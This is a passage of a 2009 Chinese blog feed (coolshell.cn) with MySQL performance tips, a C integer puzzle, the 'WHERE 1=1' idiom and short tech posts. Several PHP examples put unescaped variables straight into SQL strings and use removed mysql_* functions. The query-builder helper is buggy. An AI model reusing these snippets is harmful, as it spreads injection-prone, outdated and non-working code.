	LEFT JOIN companies ON (users.state = companies.state)
	WHERE users.id = $user_id");

// 两个 state 字段应该是被建过索引的，而且应该是相当的类型，相同的字符集。
</pre>
<h4>
<span class="ez-toc-section" id="6_%E5%8D%83%E4%B8%87%E4%B8%8D%E8%A6%81_ORDER_BY_RAND"></span>6. 千万不要 ORDER BY RAND()<span class="ez-toc-section-end"></span>
</h4>
<p>想打乱返回的数据行？随机挑一个数据？真不知道谁发明了这种用法，但很多新手很喜欢这样用。但你确不了解这样做有多么可怕的性能问题。</p>
<p>如果你真的想把返回的数据行打乱了，你有N种方法可以达到这个目的。这样使用只让你的数据库的性能呈指数级的下降。这里的问题是：MySQL会不得不去执行RAND()函数（很耗CPU时间），而且这是为了每一行记录去记行，然后再对其排序。就算是你用了Limit 1也无济于事（因为要排序）</p>
<p>下面的示例是随机挑一条记录</p>
<p></p>
<pre data-enlighter-language="php" class="EnlighterJSRAW">// 千万不要这样做：
$r = mysql_query("SELECT username FROM user ORDER BY RAND() LIMIT 1");

// 这要会更好：
$r = mysql_query("SELECT count(*) FROM user");
$d = mysql_fetch_row($r);
$rand = mt_rand(0,$d[0] - 1);

$r = mysql_query("SELECT username FROM user LIMIT $rand, 1");
</pre>
<h4>
<span class="ez-toc-section" id="7_%E9%81%BF%E5%85%8D_SELECT"></span>7. 避免 SELECT *<span class="ez-toc-section-end"></span>
</h4>
<p>从数据库里读出越多的数据，那么查询就会变得越慢。并且，如果你的数据库服务器和WEB服务器是两台独立的服务器的话，这还会增加网络传输的负载。</p>
<p>所以，你应该养成一个需要什么就取什么的好的习惯。</p>
<p></p>
<pre data-enlighter-language="php" class="EnlighterJSRAW">// 不推荐
$r = mysql_query("SELECT * FROM user WHERE user_id = 1");
$d = mysql_fetch_assoc($r);
echo "Welcome {$d['username']}";

// 推荐
$r = mysql_query("SELECT username FROM user WHERE user_id = 1");
$d = mysql_fetch_assoc($r);
echo "Welcome {$d['username']}";
</pre>
<h4>
<span class="ez-toc-section" id="8_%E6%B0%B8%E8%BF%9C%E4%B8%BA%E6%AF%8F%E5%BC%A0%E8%A1%A8%E8%AE%BE%E7%BD%AE%E4%B8%80%E4%B8%AAID"></span>8. 永远为每张表设置一个ID<span class="ez-toc-section-end"></span>
</h4>
<p>我们应该为数据库里的每张表都设置一个ID做为其主键，而且最好的是一个INT型的（推荐使用UNSIGNED），并设置上自动增加的AUTO_INCREMENT标志。</p>
<p>就算是你 users 表有一个主键叫 “email”的字段，你也别让它成为主键。使用 VARCHAR 类型来当主键会使用得性能下降。另外，在你的程序中，你应该使用表的ID来构造你的数据结构。</p>
<p>而且，在MySQL数据引擎下，还有一些操作需要使用主键，在这些情况下，主键的性能和设置变得非常重要，比如，集群，分区……</p>
<p>在这里，只有一个情况是例外，那就是“关联表”的“外键”，也就是说，这个表的主键，通过若干个别的表的主键构成。我们把这个情况叫做“外键”。比如：有一个“学生表”有学生的ID，有一个“课程表”有课程ID，那么，“成绩表”就是“关联表”了，其关联了学生表和课程表，在成绩表中，学生ID和课程ID叫“外键”其共同组成主键。</p>
<h4>
<span class="ez-toc-section" id="9_%E4%BD%BF%E7%94%A8_ENUM_%E8%80%8C%E4%B8%8D%E6%98%AF_VARCHAR"></span>9. 使用 ENUM 而不是 VARCHAR<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://dev.mysql.com/doc/refman/5.0/en/enum.html" target="_blank">ENUM</a> 类型是非常快和紧凑的。在实际上，其保存的是 TINYINT，但其外表上显示为字符串。这样一来，用这个字段来做一些选项列表变得相当的完美。</p>
<p>如果你有一个字段，比如“性别”，“国家”，“民族”，“状态”或“部门”，你知道这些字段的取值是有限而且固定的，那么，你应该使用 ENUM 而不是 VARCHAR。</p>
<p>MySQL也有一个“建议”（见第十条）告诉你怎么去重新组织你的表结构。当你有一个 VARCHAR 字段时，这个建议会告诉你把其改成 ENUM 类型。使用 PROCEDURE ANALYSE() 你可以得到相关的建议。</p>
<h4>
<span class="ez-toc-section" id="10_%E4%BB%8E_PROCEDURE_ANALYSE_%E5%8F%96%E5%BE%97%E5%BB%BA%E8%AE%AE"></span>10. 从 PROCEDURE ANALYSE() 取得建议<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://dev.mysql.com/doc/refman/5.0/en/procedure-analyse.html" target="_blank">PROCEDURE ANALYSE()</a> 会让 MySQL 帮你去分析你的字段和其实际的数据，并会给你一些有用的建议。只有表中有实际的数据，这些建议才会变得有用，因为要做一些大的决定是需要有数据作为基础的。</p>
<p>例如，如果你创建了一个 INT 字段作为你的主键，然而并没有太多的数据，那么，PROCEDURE ANALYSE()会建议你把这个字段的类型改成 MEDIUMINT 。或是你使用了一个 VARCHAR 字段，因为数据不多，你可能会得到一个让你把它改成 ENUM 的建议。这些建议，都是可能因为数据不够多，所以决策做得就不够准。</p>
<p>在phpmyadmin里，你可以在查看表时，点击 “Propose table structure” 来查看这些建议</p>
<div class="tutorial_image"><img alt="image placeholder" ></div>
<p>一定要注意，这些只是建议，只有当你的表里的数据越来越多时，这些建议才会变得准确。一定要记住，你才是最终做决定的人。</p>
<h4>
<span class="ez-toc-section" id="11_%E5%B0%BD%E5%8F%AF%E8%83%BD%E7%9A%84%E4%BD%BF%E7%94%A8_NOT_NULL"></span>11. 尽可能的使用 NOT NULL<span class="ez-toc-section-end"></span>
</h4>
<p>除非你有一个很特别的原因去使用 NULL 值，你应该总是让你的字段保持 NOT NULL。这看起来好像有点争议，请往下看。</p>
<p>首先，问问你自己“Empty”和“NULL”有多大的区别（如果是INT，那就是0和NULL）？如果你觉得它们之间没有什么区别，那么你就不要使用NULL。（你知道吗？在 Oracle 里，NULL 和 Empty 的字符串是一样的！)</p>
<p>不要以为 NULL 不需要空间，其需要额外的空间，并且，在你进行比较的时候，你的程序会更复杂。 当然，这里并不是说你就不能使用NULL了，现实情况是很复杂的，依然会有些情况下，你需要使用NULL值。</p>
<p>下面摘自MySQL自己的文档：</p>
<blockquote><p>“NULL columns require additional space in the row to record whether their values are NULL. For MyISAM tables, each NULL column takes one bit extra, rounded up to the nearest byte.”</p></blockquote>
<h4>
<span class="ez-toc-section" id="12_Prepared_Statements"></span>12. Prepared Statements<span class="ez-toc-section-end"></span>
</h4>
<p>Prepared Statements很像存储过程，是一种运行在后台的SQL语句集合，我们可以从使用 prepared statements 获得很多好处，无论是性能问题还是安全问题。</p>
<p>Prepared Statements 可以检查一些你绑定好的变量，这样可以保护你的程序不会受到“SQL注入式”攻击。当然，你也可以手动地检查你的这些变量，然而，手动的检查容易出问题，而且很经常会被程序员忘了。当我们使用一些framework或是ORM的时候，这样的问题会好一些。</p>
<p>在性能方面，当一个相同的查询被使用多次的时候，这会为你带来可观的性能优势。你可以给这些Prepared Statements定义一些参数，而MySQL只会解析一次。</p>
<p>虽然最新版本的MySQL在传输Prepared Statements是使用二进制形势，所以这会使得网络传输非常有效率。</p>
<p>当然，也有一些情况下，我们需要避免使用Prepared Statements，因为其不支持查询缓存。但据说版本5.1后支持了。</p>
<p>在PHP中要使用prepared statements，你可以查看其使用手册：<a href="https://php.net/manual/en/book.mysqli.php" target="_blank">mysqli 扩展</a> 或是使用数据库抽象层，如： <a href="http://us.php.net/manual/en/book.pdo.php" target="_blank">PDO</a>.</p>
<p></p>
<pre data-enlighter-language="php" class="EnlighterJSRAW">// 创建 prepared statement
if ($stmt = $mysqli-&gt;prepare("SELECT username FROM user WHERE state=?")) {

	// 绑定参数
    $stmt-&gt;bind_param("s", $state);

	// 执行
    $stmt-&gt;execute();

	// 绑定结果
    $stmt-&gt;bind_result($username);

	// 移动游标
    $stmt-&gt;fetch();

    printf("%s is from %s\n", $username, $state);

    $stmt-&gt;close();
}
</pre>
<h4>
<span class="ez-toc-section" id="13_%E6%97%A0%E7%BC%93%E5%86%B2%E7%9A%84%E6%9F%A5%E8%AF%A2"></span>13. 无缓冲的查询<span class="ez-toc-section-end"></span>
</h4>
<p>正常的情况下，当你在当你在你的脚本中执行一个SQL语句的时候，你的程序会停在那里直到没这个SQL语句返回，然后你的程序再往下继续执行。你可以使用无缓冲查询来改变这个行为。</p>
<p>关于这个事情，在PHP的文档中有一个非常不错的说明： <a href="https://php.net/manual/en/function.mysql-unbuffered-query.php" target="_blank">mysql_unbuffered_query()</a> 函数：</p>
<blockquote><p>“mysql_unbuffered_query() sends the SQL query query to MySQL without automatically fetching and buffering the result rows as mysql_query() does. This saves a considerable amount of memory with SQL queries that produce large result sets, and you can start working on the result set immediately after the first row has been retrieved as you don’t have to wait until the complete SQL query has been performed.”</p></blockquote>
<p>上面那句话翻译过来是说，mysql_unbuffered_query() 发送一个SQL语句到MySQL而并不像mysql_query()一样去自动fethch和缓存结果。这会相当节约很多可观的内存，尤其是那些会产生大量结果的查询语句，并且，你不需要等到所有的结果都返回，只需要第一行数据返回的时候，你就可以开始马上开始工作于查询结果了。</p>
<p>然而，这会有一些限制。因为你要么把所有行都读走，或是你要在进行下一次的查询前调用 <a href="http://us2.php.net/manual/en/function.mysql-free-result.php" target="_blank">mysql_free_result()</a> 清除结果。而且， <a href="http://us2.php.net/manual/en/function.mysql-num-rows.php" target="_blank">mysql_num_rows()</a> 或 <a href="http://us2.php.net/manual/en/function.mysql-data-seek.php" target="_blank">mysql_data_seek()</a> 将无法使用。所以，是否使用无缓冲的查询你需要仔细考虑。</p>
<h4>
<span class="ez-toc-section" id="14_%E6%8A%8AIP%E5%9C%B0%E5%9D%80%E5%AD%98%E6%88%90_UNSIGNED_INT"></span>14. 把IP地址存成 UNSIGNED INT<span class="ez-toc-section-end"></span>
</h4>
<p>很多程序员都会创建一个 VARCHAR(15) 字段来存放字符串形式的IP而不是整形的IP。如果你用整形来存放，只需要4个字节，并且你可以有定长的字段。而且，这会为你带来查询上的优势，尤其是当你需要使用这样的WHERE条件：IP between ip1 and ip2。</p>
<p>我们必需要使用UNSIGNED INT，因为 IP地址会使用整个32位的无符号整形。</p>
<p>而你的查询，你可以使用 <a href="https://dev.mysql.com/doc/refman/5.0/en/miscellaneous-functions.html#function_inet-aton" target="_blank">INET_ATON()</a> 来把一个字符串IP转成一个整形，并使用 <a href="https://dev.mysql.com/doc/refman/5.0/en/miscellaneous-functions.html#function_inet-ntoa" target="_blank">INET_NTOA()</a> 把一个整形转成一个字符串IP。在PHP中，也有这样的函数 <a href="https://php.net/manual/en/function.ip2long.php" target="_blank">ip2long()</a> 和 <a href="http://us.php.net/manual/en/function.long2ip.php" target="_blank">long2ip()</a>。</p>
<p></p>
<pre data-enlighter-language="php" class="EnlighterJSRAW">$r = "UPDATE users SET ip = INET_ATON('{$_SERVER['REMOTE_ADDR']}') WHERE user_id = $user_id";
</pre>
<h4>
<span class="ez-toc-section" id="15_%E5%9B%BA%E5%AE%9A%E9%95%BF%E5%BA%A6%E7%9A%84%E8%A1%A8%E4%BC%9A%E6%9B%B4%E5%BF%AB"></span>15. 固定长度的表会更快<span class="ez-toc-section-end"></span>
</h4>
<p>如果表中的所有字段都是“固定长度”的，整个表会被认为是 <a href="https://dev.mysql.com/doc/refman/5.1/en/static-format.html" target="_blank">“static” 或 “fixed-length”</a>。 例如，表中没有如下类型的字段： VARCHAR，TEXT，BLOB。只要你包括了其中一个这些字段，那么这个表就不是“固定长度静态表”了，这样，MySQL 引擎会用另一种方法来处理。</p>
<p>固定长度的表会提高性能，因为MySQL搜寻得会更快一些，因为这些固定的长度是很容易计算下一个数据的偏移量的，所以读取的自然也会很快。而如果字段不是定长的，那么，每一次要找下一条的话，需要程序找到主键。</p>
<p>并且，固定长度的表也更容易被缓存和重建。不过，唯一的副作用是，固定长度的字段会浪费一些空间，因为定长的字段无论你用不用，他都是要分配那么多的空间。</p>
<p>使用“垂直分割”技术（见下一条），你可以分割你的表成为两个一个是定长的，一个则是不定长的。</p>
<h4>
<span class="ez-toc-section" id="16_%E5%9E%82%E7%9B%B4%E5%88%86%E5%89%B2"></span>16. 垂直分割<span class="ez-toc-section-end"></span>
</h4>
<p>“垂直分割”是一种把数据库中的表按列变成几张表的方法，这样可以降低表的复杂度和字段的数目，从而达到优化的目的。（以前，在银行做过项目，见过一张表有100多个字段，很恐怖）</p>
<p><strong>示例一</strong>：在Users表中有一个字段是家庭地址，这个字段是可选字段，相比起，而且你在数据库操作的时候除了个人信息外，你并不需要经常读取或是改写这个字段。那么，为什么不把他放到另外一张表中呢？ 这样会让你的表有更好的性能，大家想想是不是，大量的时候，我对于用户表来说，只有用户ID，用户名，口令，用户角色等会被经常使用。小一点的表总是会有好的性能。</p>
<p><strong>示例二</strong>： 你有一个叫 “last_login” 的字段，它会在每次用户登录时被更新。但是，每次更新时会导致该表的查询缓存被清空。所以，你可以把这个字段放到另一个表中，这样就不会影响你对用户ID，用户名，用户角色的不停地读取了，因为查询缓存会帮你增加很多性能。</p>
<p>另外，你需要注意的是，这些被分出去的字段所形成的表，你不会经常性地去Join他们，不然的话，这样的性能会比不分割时还要差，而且，会是极数级的下降。</p>
<h4>
<span class="ez-toc-section" id="17_%E6%8B%86%E5%88%86%E5%A4%A7%E7%9A%84_DELETE_%E6%88%96_INSERT_%E8%AF%AD%E5%8F%A5"></span>17. 拆分大的 DELETE 或 INSERT 语句<span class="ez-toc-section-end"></span>
</h4>
<p>如果你需要在一个在线的网站上去执行一个大的 DELETE 或 INSERT 查询，你需要非常小心，要避免你的操作让你的整个网站停止相应。因为这两个操作是会锁表的，表一锁住了，别的操作都进不来了。</p>
<p>Apache 会有很多的子进程或线程。所以，其工作起来相当有效率，而我们的服务器也不希望有太多的子进程，线程和数据库链接，这是极大的占服务器资源的事情，尤其是内存。</p>
<p>如果你把你的表锁上一段时间，比如30秒钟，那么对于一个有很高访问量的站点来说，这30秒所积累的访问进程/线程，数据库链接，打开的文件数，可能不仅仅会让你泊WEB服务Crash，还可能会让你的整台服务器马上掛了。</p>
<p>所以，如果你有一个大的处理，你定你一定把其拆分，使用 LIMIT 条件是一个好的方法。下面是一个示例：</p>
<p></p>
<pre data-enlighter-language="php" class="EnlighterJSRAW">while (1) {
    //每次只做1000条
	mysql_query("DELETE FROM logs WHERE log_date &lt;= '2009-11-01' LIMIT 1000");
	if (mysql_affected_rows() == 0) {
		// 没得可删了，退出！
		break;
	}
	// 每次都要休息一会儿
	usleep(50000);
}
</pre>
<h4>
<span class="ez-toc-section" id="18_%E8%B6%8A%E5%B0%8F%E7%9A%84%E5%88%97%E4%BC%9A%E8%B6%8A%E5%BF%AB"></span>18. 越小的列会越快<span class="ez-toc-section-end"></span>
</h4>
<p>对于大多数的数据库引擎来说，硬盘操作可能是最重大的瓶颈。所以，把你的数据变得紧凑会对这种情况非常有帮助，因为这减少了对硬盘的访问。</p>
<p>参看 MySQL 的文档 <a href="https://dev.mysql.com/doc/refman/5.0/en/storage-requirements.html" target="_blank">Storage Requirements</a> 查看所有的数据类型。</p>
<p>如果一个表只会有几列罢了（比如说字典表，配置表），那么，我们就没有理由使用 INT 来做主键，使用 MEDIUMINT, SMALLINT 或是更小的 TINYINT 会更经济一些。如果你不需要记录时间，使用 DATE 要比 DATETIME 好得多。</p>
<p>当然，你也需要留够足够的扩展空间，不然，你日后来干这个事，你会死的很难看，参看<a href="https://news.slashdot.org/article.pl?sid=06/11/09/1534204" target="_blank">Slashdot的例子</a>（2009年11月06日），一个简单的ALTER TABLE语句花了3个多小时，因为里面有一千六百万条数据。</p>
<h4>
<span class="ez-toc-section" id="19_%E9%80%89%E6%8B%A9%E6%AD%A3%E7%A1%AE%E7%9A%84%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E"></span>19. 选择正确的存储引擎<span class="ez-toc-section-end"></span>
</h4>
<p>在 MySQL 中有两个存储引擎 MyISAM 和 InnoDB，每个引擎都有利有弊。酷壳以前文章《<a href="https://coolshell.cn/articles/652.html" target="_blank">MySQL: InnoDB 还是 MyISAM?</a>》讨论和这个事情。</p>
<p>MyISAM 适合于一些需要大量查询的应用，但其对于有大量写操作并不是很好。甚至你只是需要update一个字段，整个表都会被锁起来，而别的进程，就算是读进程都无法操作直到读操作完成。另外，MyISAM 对于 SELECT COUNT(*) 这类的计算是超快无比的。</p>
<p>InnoDB 的趋势会是一个非常复杂的存储引擎，对于一些小的应用，它会比 MyISAM 还慢。他是它支持“行锁” ，于是在写操作比较多的时候，会更优秀。并且，他还支持更多的高级应用，比如：事务。</p>
<p>下面是MySQL的手册</p>
<ul>
<li><a href="https://dev.mysql.com/doc/refman/5.1/en/myisam-storage-engine.html">target=”_blank”MyISAM Storage Engine</a></li>
<li><a href="https://dev.mysql.com/doc/refman/5.1/en/innodb.html" target="_blank">InnoDB Storage Engine</a></li>
</ul>
<h4>
<span class="ez-toc-section" id="20_%E4%BD%BF%E7%94%A8%E4%B8%80%E4%B8%AA%E5%AF%B9%E8%B1%A1%E5%85%B3%E7%B3%BB%E6%98%A0%E5%B0%84%E5%99%A8%EF%BC%88Object_Relational_Mapper%EF%BC%89"></span>20. 使用一个对象关系映射器（Object Relational Mapper）<span class="ez-toc-section-end"></span>
</h4>
<p>使用 ORM (Object Relational Mapper)，你能够获得可靠的性能增涨。一个ORM可以做的所有事情，也能被手动的编写出来。但是，这需要一个高级专家。</p>
<p>ORM 的最重要的是“Lazy Loading”，也就是说，只有在需要的去取值的时候才会去真正的去做。但你也需要小心这种机制的副作用，因为这很有可能会因为要去创建很多很多小的查询反而会降低性能。</p>
<p>ORM 还可以把你的SQL语句打包成一个事务，这会比单独执行他们快得多得多。</p>
<p>目前，个人最喜欢的PHP的ORM是：<a href="http://www.doctrine-project.org" target="_blank">Doctrine</a>。</p>
<h4>
<span class="ez-toc-section" id="21_%E5%B0%8F%E5%BF%83%E6%B0%B8%E4%B9%85%E9%93%BE%E6%8E%A5"></span>21. 小心“永久链接”<span class="ez-toc-section-end"></span>
</h4>
<p>“永久链接”的目的是用来减少重新创建MySQL链接的次数。当一个链接被创建了，它会永远处在连接的状态，就算是数据库操作已经结束了。而且，自从我们的Apache开始重用它的子进程后——也就是说，下一次的HTTP请求会重用Apache的子进程，并重用相同的 MySQL 链接。</p>
<ul>
<li><a href="https://php.net/manual/en/function.mysql-pconnect.php" target="_blank">PHP手册：mysql_pconnect() </a></li>
</ul>
<p>在理论上来说，这听起来非常的不错。但是从个人经验（也是大多数人的）上来说，这个功能制造出来的麻烦事更多。因为，你只有有限的链接数，内存问题，文件句柄数，等等。</p>
<p>而且，Apache 运行在极端并行的环境中，会创建很多很多的了进程。这就是为什么这种“永久链接”的机制工作地不好的原因。在你决定要使用“永久链接”之前，你需要好好地考虑一下你的整个系统的架构。</p>
<p>文章：<a href="http://net.tutsplus.com/tutorials/other/top-20-mysql-best-practices/" target="_blank">来源</a></p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2009-11-27T18:57:33+08:00</pubDate>
<guid>https://coolshell.cn/articles/1846.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ C 语言整型谜题 ]]></title>
<link>https://coolshell.cn/articles/1857.html</link>
<content><![CDATA[ 
<p>如题，此篇文章是描述C语言中的整数谜题。</p>
<p>假定机器字长是32位的，用2的补码表示整数。对以下C表达式，请问它们在所有情况下都正确吗？如果不是，请给出反例。</p>
<p>初始化：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">int x = foo();
int y = bar();
unsigned ux = x;
unsigned uy = y;</pre>
<p>1. 若x &lt; 0, 则x * 2 &lt; 0</p>
<p>2. ux &gt;= 0</p>
<p>3. 若x &amp; 7 == 7， 则(x &lt;&lt; 30) &lt; 0</p>
<p>4. ux &gt; -1</p>
<p>5. 若x &gt; y, 则-x &lt; -y</p>
<p>6. x * x &gt;= 0</p>
<p>7. 若x &gt; 0 &amp;&amp; y &gt; 0, 则x + y &gt; 0</p>
<p>8. 若x &gt;= 0, 则-x &lt;= 0</p>
<p>9. 若x &lt;= 0, 则-x &gt;= 0</p>
<p>答案如下：</p>
<p><span id="more-1857"></span></p>
<p>1. 错。当x = INT_MIN</p>
<p>2. 正确。</p>
<p>3. 正确。</p>
<p>4. 错。-1被转换成UINT_MAX</p>
<p>5. 错。当x = -1, y = INT_MIN</p>
<p>6. 错。当x = 65535</p>
<p>7. 错。INT_MAX 和 INT_MAX</p>
<p>8. 正确。</p>
<p>9. 错。INT_MIN</p>
 ]]></content>
<pubDate>2009-11-29T00:45:17+08:00</pubDate>
<guid>https://coolshell.cn/articles/1857.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 编程语言时间地理图 ]]></title>
<link>https://coolshell.cn/articles/1863.html</link>
<content><![CDATA[ 
<p style="text-align: left;"> 有人使用Google Map做了一个<a href="http://www.geospat.com/hoprola/" target="_blank">网页</a>，把所有编程语言的时间线和地理位置，如下图，上面是一个编程语言的时间轴，下面是Google Map地图，点击编程语言，你可以查看该编程语言的发明者，发明地，和其Hello World示例（点击<a href="https://coolshell.cn/articles/169.html" target="_blank">这里</a>查看更多的Hello World）</p>
<p style="text-align: center;"><a href="http://www.geospat.com/hoprola/" target="_blank"><strong>http://www.geospat.com/hoprola/</strong></a><br>
<a href="https://coolshell.cn/wp-content/uploads/2009/11/programming_language_timeline.jpg" target="_blank"><img alt="image placeholder" ></a></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: center;">（点击小星，可以看到语言的发明者和示例）</p>
<p></p>
 ]]></content>
<pubDate>2009-11-30T07:33:04+08:00</pubDate>
<guid>https://coolshell.cn/articles/1863.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Javascript程序员嘴最脏?? ]]></title>
<link>https://coolshell.cn/articles/1850.html</link>
<content><![CDATA[ 
<p>请看下图，我在Google Code上，针对每个程序语言都搜索了一下“fuck”一词的出现文件的个数X，以及没有出现fuck一词的文件的个数Y，然后放在Excel里求了一下百分比（X/(X+Y) * 100%），做了一个图。结果，JavaScript语言中出现的次数高达0.56%，名列全部语言之首，然后是Perl，C 和 PHP。（对于Javascript程序员的这种行为可以理解，因为IE，因为浏览器嘛，我就不多说了）</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">相关的数据表格如下：</p>
<p style="text-align: left;"><span id="more-1850"></span></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">（全文完）</p>
<p></p>
 ]]></content>
<pubDate>2009-11-30T08:16:54+08:00</pubDate>
<guid>https://coolshell.cn/articles/1850.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Coderun.com 在线开发IDE ]]></title>
<link>https://coolshell.cn/articles/1883.html</link>
<content><![CDATA[ 
<p>相信大家都还记得我以前向大家推荐的《<a rel="bookmark" href="https://coolshell.cn/articles/1310.html">在线代码编译服务Codepad.org</a>》吧。这回的这个更猛——在线的代码开发的IDE，可以编译，执行，调试。不过，主要针对Web方面的，主要是C#，ASP.NET，Javascript(JQuery)和PHP，很强大哦。那句话是怎么说来的——“如果一个软件可以用Javascript来写，那么这个软件的最终版本会是Javascript”。这个在线的IDE是：</p>
<p style="text-align: center;"><a href="http://www.coderun.com/ide/" target="_blank"><strong>http://www.coderun.com/ide/</strong></a></p>
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2009/11/coderun.ide_.jpg"></a><a href="https://coolshell.cn/wp-content/uploads/2009/11/coderun.ide_.jpg"></a><a href="https://coolshell.cn/wp-content/uploads/2009/11/coderun.ide_.jpg"><img alt="image placeholder" ></a></p>
<p style="TEXT-ALIGN: left">有朋友在留言中说，这个项目可能不实用，没什么意思，而我想说，Google的Chrome OS项目可能非常喜欢这个东西。顺便说一下，这个Online的IDE是开源的，源码在这里：<a href="https://coderun.codeplex.com/">http://coderun.codeplex.com/</a>。 </p>
<p></p>
 ]]></content>
<pubDate>2009-12-01T13:41:12+08:00</pubDate>
<guid>https://coolshell.cn/articles/1883.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ SQL的Where语句 ]]></title>
<link>https://coolshell.cn/articles/1889.html</link>
<content><![CDATA[ 
<p>某DBA在查看自己的数库日志的时候，看到了数据库服务器上出现了很多很怪异的SQL的Where条件语句，是下面这个样子：（所有的where语句前都有了一个叫“1=1”的子条件）呵呵。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>要理解这个事情的原因其实并不难。只要你是一个编写数据库的程序员，你就会知道——动态生成where后的条件的“麻烦”，那就是条件的“分隔”-and或or。下面听我慢慢说来。</p>
<p><span id="more-1889"></span></p>
<p>我们知道，大多数的查询表单都需要用户输出一堆查询条件，然后我们的程序在后台要把这些子条件用and组合起来。于是，把and加在各个条件的中间就成为了一件“难事”，因为你的程序需要判断：</p>
<ul>
<li>如果没有条件的话，则不需要where</li>
<li>如果只有一个条件的话，不需要and.</li>
<li>如果有多个条件的话，
<ul>
<li>如果and是持续加在每个条件后面的话，那么就要判断是否是最后一个条件，因为最后一个不能加and.</li>
<li>同样，如果and是要加在每个条件前面的话，你就需要判断是否是第一个，如果是，那就不加。</li>
</ul>
</li>
</ul>
<p>真是TMD太烦了，所以，编程“大拿”引入了“1=1”条件语句。于是，编程的难度大幅度下降，你可以用单一的方式来处理这若干的查询子条件了。而1=1应该会被数据库引擎优化时给去掉了。</p>
<p></p>
<pre data-enlighter-language="php" class="EnlighterJSRAW">&lt;pre&gt;&lt;code&gt;$query = "SELECT name FROM table WHERE 1=1 ";

foreach($clauses as $key =&gt; $value){
    $query .= " AND ".escape($key)."=".escape($value)." ";
}
&lt;/code&gt;&lt;/pre&gt;
</pre>
<p>呵呵，<strong>DBA怎么能够理解我们疯狂程序员的用心良苦啊</strong>。</p>
<p>另外，在这里说一下，这样的做法看似很愚蠢，但很有效，在PHP的世界中，也有人使用下面这样的做法——使用了PHP的implode函数。</p>
<p></p>
<pre data-enlighter-language="php" class="EnlighterJSRAW">&lt;pre&gt;&lt;code&gt;/**
 * @param string $base base of query, e.g. UPDATE table SET
 * @param string $logic logic for concatenating $assoc, e.g. AND
 * @param array $assoc associative array of `field`=&gt;'value' pairs to concatenate and append to $base
 * @param string $suffix additional clauses, e.g. LIMIT 0,30
 * @return string
 */
function construct_sql($base, $logic, $clauses, $suffix='')
{
    // initialise array to avoid warnings/notices on some PHP installations
    $queries = array();

    // create array of strings to be glued together by logic
    foreach($clauses as $key =&gt; $value)
        $queries[] = "`" . escape($key) . "`='" . escape($value) . "'";

    // add a space in case $base doesn't have a space at the end and glue clauses together
    $query .= " " . implode(" $logic ",$queries) . " " . $suffix . ";";

    return $query;
}

/**
 * @param string $str string to escape for intended use
 * @return string
 */
function escape($str)
{
    return mysql_real_escape_string($str);
}
&lt;/code&gt;&lt;/pre&gt;
</pre>
<p>于是，我们可以这样使用：（<code>为什么我们要在update语句后加上“Limit 1”呢？这个关系到性能问题，关于这方面的话题，你可以查看本站的《<a title="MySQL性能优化的最佳20+条经验" href="https://coolshell.cn/articles/1846.html">MySQL性能优化的最佳20+条经验</a>》</code>）</p>
<p></p>
<pre data-enlighter-language="php" class="EnlighterJSRAW">&lt;pre&gt;&lt;code&gt;$updates = array(
    'field1'=&gt;'val1'
    'field2'=&gt;'val2'
);
$wheres = array(
    'field1'=&gt;'cond1',
    'field2'=&gt;'cond2'
);
echo construct_sql(construct_sql("UPDATE table SET", ", ", $updates) . " WHERE ", " AND ", $wheres),"LIMIT 1");
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;/pre&gt;
</pre>
<p><code>下面是输出结果：</code></p>
<p><code data-enlighter-language="php" class="EnlighterJSRAW">UPDATE table SET `field1`='val1', `field2`='val2' WHERE `field1`='cond1' AND `field2`='cond2' LIMIT 1;</code></p>
<p> </p>
<p><code>（全文完）</code></p>
 ]]></content>
<pubDate>2009-12-01T13:48:25+08:00</pubDate>
<guid>https://coolshell.cn/articles/1889.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 我是怎么招聘程序员的 ]]></title>
<link>https://coolshell.cn/articles/1870.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >很早以前就想写一篇和面试相关的文章了，今天在网络上看到一篇关于如何去面试程序员的<a href="http://www.aaronsw.com/weblog/hiring" target="_blank">英文文章</a>，发现其中有很多和我共鸣的东西，所以仿照其标题通过自己的经历写下了这篇文章。</p>
<p>工作这么多年来，即被面试过，也面试过他人，对于程序员的面试，经历过很不错的面试，很专业的面试，也经历过一些BT和令人不爽的面试，我个人觉得一个好的面试，面试官是很重要的，所以，本文想从“面试官”的角度来阐述一下。于是，有了下面这样一篇的文章，希望本文对你的职场经历有用，特别是那些正在招聘和面试程序员的朋友，我觉得这篇文章会对大家有很多启示。此外，做为被面试的人，你可以看看本站的《<a href="https://coolshell.cn/articles/1695.html" rel="bookmark">别的程序员是怎么读你的简历的</a>》《<a href="https://coolshell.cn/articles/428.html" rel="bookmark">程序员需要具备的基本技能</a>》《<a href="https://coolshell.cn/articles/222.html" rel="bookmark">优秀程序员的十个习惯</a>》其它一些和<a href="https://coolshell.cn/?tag=programmer" target="_blank">程序员相关的文章</a>。</p>
<p>对于招聘方来说，在招聘程序员的时候，我估计面试应聘者时，最主要想知道的是下面三件事：</p>
<ol>
<li>这个程序员的是否够聪明？</li>
<li>这个程序员能否把事情搞定？</li>
<li>这个程序员能和我的团队在一起工作吗？</li>
</ol>
